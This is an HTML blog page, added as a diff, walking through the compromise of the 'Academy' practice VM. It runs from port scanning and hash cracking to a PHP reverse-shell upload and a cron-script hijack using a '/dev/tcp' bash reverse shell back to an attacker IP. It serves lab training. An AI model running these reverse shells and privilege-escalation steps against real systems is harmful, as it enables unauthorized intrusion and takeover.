@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Academy Machine Walkthrough - Complete penetration testing guide">
+    <title>Academy Machine Walkthrough | Muhammad Mughees</title>
+    <link rel="stylesheet" href="../../styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .walkthrough-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        .walkthrough-header {
+            text-align: center;
+            margin-bottom: 3rem;
+            padding: 2rem;
+            background: linear-gradient(135deg, var(--secondary-color) 0%, #112240 100%);
+            border-radius: 10px;
+        }
+
+        .walkthrough-header h1 {
+            font-size: 2.5rem;
+            color: var(--primary-color);
+            margin-bottom: 1rem;
+        }
+
+        .walkthrough-section {
+            margin-bottom: 3rem;
+            background: rgba(255, 255, 255, 0.03);
+            padding: 2rem;
+            border-radius: 10px;
+            border-left: 4px solid var(--primary-color);
+        }
+
+        .walkthrough-section h2 {
+            color: var(--primary-color);
+            margin-bottom: 1.5rem;
+            font-size: 2rem;
+        }
+
+        .walkthrough-section h3 {
+            color: var(--accent-color);
+            margin-top: 2rem;
+            margin-bottom: 1rem;
+            font-size: 1.5rem;
+        }
+
+        .walkthrough-section p {
+            line-height: 1.8;
+            margin-bottom: 1rem;
+            color: #8892b0;
+        }
+
+        .walkthrough-section code {
+            background: rgba(100, 255, 218, 0.1);
+            padding: 0.2rem 0.5rem;
+            border-radius: 4px;
+            color: var(--accent-color);
+            font-family: 'Courier New', monospace;
+        }
+
+        .walkthrough-section pre {
+            background: #112240;
+            padding: 1.5rem;
+            border-radius: 8px;
+            overflow-x: auto;
+            margin: 1.5rem 0;
+            border: 1px solid var(--primary-color);
+        }
+
+        .walkthrough-section pre code {
+            background: none;
+            padding: 0;
+            color: var(--primary-color);
+        }
+
+        .walkthrough-image {
+            text-align: center;
+            margin: 2rem 0;
+        }
+
+        .walkthrough-image img {
+            max-width: 100%;
+            border-radius: 10px;
+            border: 2px solid var(--primary-color);
+            box-shadow: 0 10px 30px rgba(0, 255, 136, 0.2);
+        }
+
+        .back-to-blog {
+            display: inline-block;
+            padding: 1rem 2rem;
+            background: var(--primary-color);
+            color: var(--secondary-color);
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            margin-bottom: 2rem;
+        }
+
+        .back-to-blog:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 255, 136, 0.3);
+        }
+
+        .info-box {
+            background: rgba(100, 255, 218, 0.1);
+            padding: 1.5rem;
+            border-radius: 8px;
+            border-left: 4px solid var(--accent-color);
+            margin: 1.5rem 0;
+        }
+
+        .warning-box {
+            background: rgba(255, 136, 0, 0.1);
+            padding: 1.5rem;
+            border-radius: 8px;
+            border-left: 4px solid #ff8800;
+            margin: 1.5rem 0;
+        }
+
+        ul {
+            list-style: none;
+            padding-left: 0;
+        }
+
+        ul li {
+            padding-left: 1.5rem;
+            margin-bottom: 0.5rem;
+            color: #8892b0;
+            position: relative;
+        }
+
+        ul li:before {
+            content: "▹";
+            position: absolute;
+            left: 0;
+            color: var(--primary-color);
+        }
+
+        @media (max-width: 768px) {
+            .walkthrough-container {
+                padding: 1rem;
+            }
+
+            .walkthrough-header h1 {
+                font-size: 2rem;
+            }
+
+            .walkthrough-section {
+                padding: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="walkthrough-container">
+        <a href="../../blog.html" class="back-to-blog">
+            <i class="fas fa-arrow-left"></i> Back to Blog
+        </a>
+
+        <div class="walkthrough-header">
+            <h1>Academy Machine Walkthrough</h1>
+            <p style="color: var(--accent-color); font-size: 1.2rem;">A Complete Penetration Testing Guide</p>
+        </div>
+
+        <!-- Overview -->
+        <div class="walkthrough-section">
+            <h2><i class="fas fa-info-circle"></i> Overview</h2>
+            <p>This walkthrough demonstrates a complete penetration test of the Academy machine. We'll go through reconnaissance, vulnerability identification, exploitation, and privilege escalation to gain root access.</p>
+            
+            <div class="info-box">
+                <strong>Target Machine:</strong> Academy<br>
+                <strong>IP Address:</strong> 10.0.2.4<br>
+                <strong>Difficulty:</strong> Easy to Medium<br>
+                <strong>Skills Required:</strong> Nmap, Hash Cracking, Directory Enumeration, PHP Exploitation, Privilege Escalation
+            </div>
+
+            <p><strong>All VMs are available here:</strong> <a href="https://drive.google.com/drive/folders/1xJy4ozXaahXvjbgTeJVWyY-eUGIKgCj1" target="_blank" style="color: var(--primary-color);">VMs - Google Drive</a></p>
+        </div>
+
+        <!-- Setup -->
+        <div class="walkthrough-section">
+            <h2><i class="fas fa-cog"></i> Initial Setup</h2>
+            
+            <h3>Academy Machine Configuration</h3>
+            <p>Login credentials for the Academy VM:</p>
+            <pre><code>Username: root
+Password: tcm</code></pre>
+
+            <p>After logging in, obtain an IP address:</p>
+            <pre><code>dhclient
+ip a</code></pre>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-3c806a1b-5c5d-4a88-b455-1233216275f0-Part-1/image 1.png" alt="Academy IP Configuration">
+            </div>
+        </div>
+
+        <!-- Reconnaissance -->
+        <div class="walkthrough-section">
+            <h2><i class="fas fa-search"></i> Reconnaissance</h2>
+            
+            <h3>Initial Nmap Scan</h3>
+            <p>Start with a basic port scan:</p>
+            <pre><code>nmap 10.0.2.4</code></pre>
+
+            <p>Three ports were discovered as open. Let's perform a deeper scan:</p>
+            <pre><code>nmap -p 21,22,80 -A 10.0.2.4</code></pre>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-3c806a1b-5c5d-4a88-b455-1233216275f0-Part-1/image 2.png" alt="Nmap Scan Results">
+            </div>
+
+            <h3>Discovered Services</h3>
+            <ul>
+                <li><strong>Port 21:</strong> FTP (vsftpd 3.0.3) - Anonymous login allowed with a note.txt file</li>
+                <li><strong>Port 22:</strong> SSH (OpenSSH)</li>
+                <li><strong>Port 80:</strong> HTTP (Apache httpd)</li>
+            </ul>
+
+            <h3>Vulnerability Research</h3>
+            <p>Researching the service versions revealed that vsftpd 3.0.3 only has a DoS vulnerability, which isn't useful for our purposes. The other services also had no critical exploits for their versions.</p>
+        </div>
+
+        <!-- Web Enumeration -->
+        <div class="walkthrough-section">
+            <h2><i class="fas fa-globe"></i> Web Service Enumeration</h2>
+            
+            <h3>HTTP Analysis</h3>
+            <p>Visiting http://10.0.2.4 shows the Debian default page. While not immediately exploitable, this should be reported in a penetration test as it's considered poor security hygiene.</p>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-3c806a1b-5c5d-4a88-b455-1233216275f0-Part-1/image 4.png" alt="Debian Default Page">
+            </div>
+
+            <h3>FTP Investigation</h3>
+            <p>Let's connect to FTP with anonymous credentials:</p>
+            <pre><code>ftp 10.0.2.4
+Username: anonymous
+Password: (press enter)
+get note.txt
+exit</code></pre>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-3c806a1b-5c5d-4a88-b455-1233216275f0-Part-1/image 5.png" alt="FTP Anonymous Login">
+            </div>
+
+            <h3>Analyzing note.txt</h3>
+            <p>The note reveals database credentials:</p>
+            <ul>
+                <li><strong>StudentRegno:</strong> 10201321</li>
+                <li><strong>StudentPhoto:</strong> null</li>
+                <li><strong>Password:</strong> cd73502828457d15655bbd7a63fb0bc8 (appears to be a hash)</li>
+            </ul>
+
+            <p>Note: "The StudentRegno number is what you use for login."</p>
+        </div>
+
+        <!-- Hash Cracking -->
+        <div class="walkthrough-section">
+            <h2><i class="fas fa-key"></i> Hash Cracking</h2>
+            
+            <h3>Hash Identification</h3>
+            <p>Use hash-identifier to determine the hash type:</p>
+            <pre><code>hash-identifier
+cd73502828457d15655bbd7a63fb0bc8</code></pre>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-3c806a1b-5c5d-4a88-b455-1233216275f0-Part-1/image 6.png" alt="Hash Identification">
+            </div>
+
+            <p>The hash is identified as MD5. Save it to a file and crack it using hashcat:</p>
+            <pre><code>echo "cd73502828457d15655bbd7a63fb0bc8" > hash.txt
+hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-3c806a1b-5c5d-4a88-b455-1233216275f0-Part-1/image 7.png" alt="Hashcat Cracking">
+            </div>
+
+            <div class="info-box">
+                <strong>Cracked Password:</strong> student
+            </div>
+        </div>
+
+        <!-- Directory Enumeration -->
+        <div class="walkthrough-section">
+            <h2><i class="fas fa-folder-open"></i> Directory Enumeration</h2>
+            
+            <p>With credentials but no clear target, directory enumeration is the next logical step. Using ffuf for first-level enumeration:</p>
+            <pre><code>ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.0.2.4/FUZZ</code></pre>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-3c806a1b-5c5d-4a88-b455-1233216275f0-Part-1/image 8.png" alt="Directory Enumeration Results">
+            </div>
+
+            <h3>Discovered Directories</h3>
+            <ul>
+                <li>/academy - Student portal (Status: 301)</li>
+                <li>/phpmyadmin - Database interface</li>
+                <li>/server-status - Apache status page</li>
+            </ul>
+
+            <p><strong>Note:</strong> For deeper enumeration within directories, consider using Dirb.</p>
+        </div>
+
+        <!-- Exploitation -->
+        <div class="walkthrough-section">
+            <h2><i class="fas fa-bug"></i> Initial Exploitation</h2>
+            
+            <h3>Academy Login Portal</h3>
+            <p>Navigating to http://10.0.2.4/academy reveals a student login page.</p>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-3c806a1b-5c5d-4a88-b455-1233216275f0-Part-1/image 9.png" alt="Academy Login Page">
+            </div>
+
+            <p>Login with the discovered credentials:</p>
+            <ul>
+                <li><strong>StudentRegno:</strong> 10201321</li>
+                <li><strong>Password:</strong> student</li>
+            </ul>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-3c806a1b-5c5d-4a88-b455-1233216275f0-Part-1/image 10.png" alt="Academy Dashboard">
+            </div>
+
+            <h3>PHP Reverse Shell Upload</h3>
+            <p>After logging in, the "My Profile" section reveals a photo upload functionality. Since the site uses PHP, we can attempt to upload a PHP reverse shell.</p>
+
+            <p>Download the pentestmonkey PHP reverse shell:</p>
+            <pre><code># Visit: https://github.com/pentestmonkey/php-reverse-shell
+# Download and modify the shell
+nano shell.php
+
+# Change these lines:
+$ip = '10.0.2.15';  // Your attacker IP
+$port = 1234;</code></pre>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-3c806a1b-5c5d-4a88-b455-1233216275f0-Part-1/image 13.png" alt="Modifying Reverse Shell">
+            </div>
+
+            <p>Set up a netcat listener:</p>
+            <pre><code>nc -nvlp 1234</code></pre>
+
+            <p>Upload the shell.php file through the photo upload section.</p>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-3c806a1b-5c5d-4a88-b455-1233216275f0-Part-1/image 14.png" alt="Shell Upload Success">
+            </div>
+
+            <h3>Shell Access Gained</h3>
+            <div class="walkthrough-image">
+                <img src="ExportBlock-3c806a1b-5c5d-4a88-b455-1233216275f0-Part-1/image 15.png" alt="Reverse Shell Connected">
+            </div>
+
+            <p>Check user privileges:</p>
+            <pre><code>whoami
+# Output: www-data (not root, no sudo available)</code></pre>
+        </div>
+
+        <!-- Privilege Escalation -->
+        <div class="walkthrough-section">
+            <h2><i class="fas fa-arrow-up"></i> Privilege Escalation</h2>
+            
+            <h3>Using LinPEAS for Enumeration</h3>
+            <p>Download LinPEAS from: <a href="https://github.com/peass-ng/PEASS-ng/releases" target="_blank" style="color: var(--primary-color);">PEASS-ng Releases</a></p>
+
+            <p>Host a Python HTTP server on your attacker machine:</p>
+            <pre><code>python3 -m http.server 80</code></pre>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-3c806a1b-5c5d-4a88-b455-1233216275f0-Part-1/image 16.png" alt="Python HTTP Server">
+            </div>
+
+            <p>On the target machine, download and execute LinPEAS:</p>
+            <pre><code>cd /tmp
+wget http://10.0.2.15/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh</code></pre>
+
+            <h3>LinPEAS Findings</h3>
+            
+            <div class="walkthrough-image">
+                <img src="ExportBlock-3c806a1b-5c5d-4a88-b455-1233216275f0-Part-1/image 17.png" alt="LinPEAS Output - User">
+            </div>
+
+            <p>Key discoveries:</p>
+            <ul>
+                <li>User <code>grimmie</code> exists with admin privileges</li>
+                <li>Cron job found: <code>* * * * * /home/grimmie/backup.sh</code></li>
+            </ul>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-3c806a1b-5c5d-4a88-b455-1233216275f0-Part-1/image 18.png" alt="LinPEAS - Grimmie Admin">
+            </div>
+
+            <h3>Database Credentials Discovery</h3>
+            
+            <div class="walkthrough-image">
+                <img src="ExportBlock-3c806a1b-5c5d-4a88-b455-1233216275f0-Part-1/image 19.png" alt="Password in Config File">
+            </div>
+
+            <p>LinPEAS revealed credentials in a PHP config file:</p>
+            <pre><code>cat /var/www/html/academy/includes/config.php</code></pre>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-3c806a1b-5c5d-4a88-b455-1233216275f0-Part-1/image 20.png" alt="Config File Contents">
+            </div>
+
+            <div class="info-box">
+                <strong>Username:</strong> grimmie<br>
+                <strong>Password:</strong> My_V3ryS3cur3_P4ss
+            </div>
+
+            <h3>SSH as Grimmie</h3>
+            <p>Attempt SSH login with the discovered credentials:</p>
+            <pre><code>ssh grimmie@10.0.2.4
+Password: My_V3ryS3cur3_P4ss</code></pre>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-3c806a1b-5c5d-4a88-b455-1233216275f0-Part-1/image 21.png" alt="SSH as Grimmie">
+            </div>
+
+            <p>Successfully logged in as grimmie! However, sudo is not available.</p>
+
+            <h3>Analyzing backup.sh</h3>
+            <p>In /home/grimmie, we find backup.sh which removes backup.zip periodically. Checking crontab returns nothing, so we'll use pspy to monitor processes.</p>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-3c806a1b-5c5d-4a88-b455-1233216275f0-Part-1/image 22.png" alt="Crontab Empty">
+            </div>
+
+            <h3>Using pspy for Process Monitoring</h3>
+            <p>Download pspy64 from: <a href="https://github.com/DominicBreuker/pspy" target="_blank" style="color: var(--primary-color);">pspy GitHub</a></p>
+
+            <pre><code>wget http://10.0.2.15/pspy64
+chmod +x pspy64
+./pspy64</code></pre>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-3c806a1b-5c5d-4a88-b455-1233216275f0-Part-1/image 23.png" alt="pspy Download">
+            </div>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-3c806a1b-5c5d-4a88-b455-1233216275f0-Part-1/image 24.png" alt="pspy Output">
+            </div>
+
+            <p>pspy confirms that backup.sh is executed multiple times per minute as root!</p>
+
+            <h3>Exploiting backup.sh</h3>
+            <p>Since grimmie owns backup.sh and it runs as root, we can inject a bash reverse shell.</p>
+
+            <p>Create a bash reverse shell one-liner:</p>
+            <pre><code>bash -i >& /dev/tcp/10.0.2.15/8080 0>&1</code></pre>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-3c806a1b-5c5d-4a88-b455-1233216275f0-Part-1/image 25.png" alt="Bash Reverse Shell">
+            </div>
+
+            <p>Replace the contents of backup.sh:</p>
+            <pre><code>echo 'bash -i >& /dev/tcp/10.0.2.15/8080 0>&1' > /home/grimmie/backup.sh</code></pre>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-3c806a1b-5c5d-4a88-b455-1233216275f0-Part-1/image 26.png" alt="Modified backup.sh">
+            </div>
+
+            <p>Set up a listener on port 8080:</p>
+            <pre><code>nc -nvlp 8080</code></pre>
+
+            <p>Wait for the cron job to execute (within a minute)...</p>
+        </div>
+
+        <!-- Root Access -->
+        <div class="walkthrough-section">
+            <h2><i class="fas fa-flag-checkered"></i> Root Access</h2>
+            
+            <div class="walkthrough-image">
+                <img src="ExportBlock-3c806a1b-5c5d-4a88-b455-1233216275f0-Part-1/image 27.png" alt="Root Shell">
+            </div>
+
+            <p>Success! We have root access.</p>
+
+            <pre><code>whoami
+# Output: root
+
+ls
+cat flag.txt</code></pre>
+
+            <div class="info-box">
+                <strong>Box Rooted Successfully! 🎉</strong>
+            </div>
+        </div>
+
+        <!-- Summary -->
+        <div class="walkthrough-section">
+            <h2><i class="fas fa-list-check"></i> Summary</h2>
+            
+            <h3>Attack Chain</h3>
+            <ul>
+                <li>Nmap scan revealed FTP, SSH, and HTTP services</li>
+                <li>Anonymous FTP access provided database credentials (hashed)</li>
+                <li>Cracked MD5 hash to obtain student password</li>
+                <li>Directory enumeration discovered /academy portal</li>
+                <li>Logged into student portal using cracked credentials</li>
+                <li>Uploaded PHP reverse shell via photo upload function</li>
+                <li>Gained www-data shell access</li>
+                <li>Used LinPEAS to discover grimmie user and credentials</li>
+                <li>SSH'd as grimmie user with found credentials</li>
+                <li>Discovered backup.sh running as root via pspy</li>
+                <li>Modified backup.sh with reverse shell payload</li>
+                <li>Gained root access when cron executed the modified script</li>
+            </ul>
+
+            <h3>Key Lessons</h3>
+            <ul>
+                <li>Always check for anonymous FTP access</li>
+                <li>Weak passwords and password reuse are common vulnerabilities</li>
+                <li>File upload functionality can be exploited if not properly secured</li>
+                <li>Configuration files often contain sensitive credentials</li>
+                <li>Scripts executed by cron jobs should have restricted write permissions</li>
+                <li>Process monitoring tools like pspy can reveal hidden automation</li>
+            </ul>
+
+            <div class="warning-box">
+                <strong>Disclaimer:</strong> This walkthrough is for educational purposes only. Always obtain proper authorization before performing penetration testing on any system.
+            </div>
+        </div>
+
+        <a href="../../blog.html" class="back-to-blog">
+            <i class="fas fa-arrow-left"></i> Back to Blog
+        </a>
+    </div>
+
+    <script src="../../script.js"></script>
+</body>
+</html>
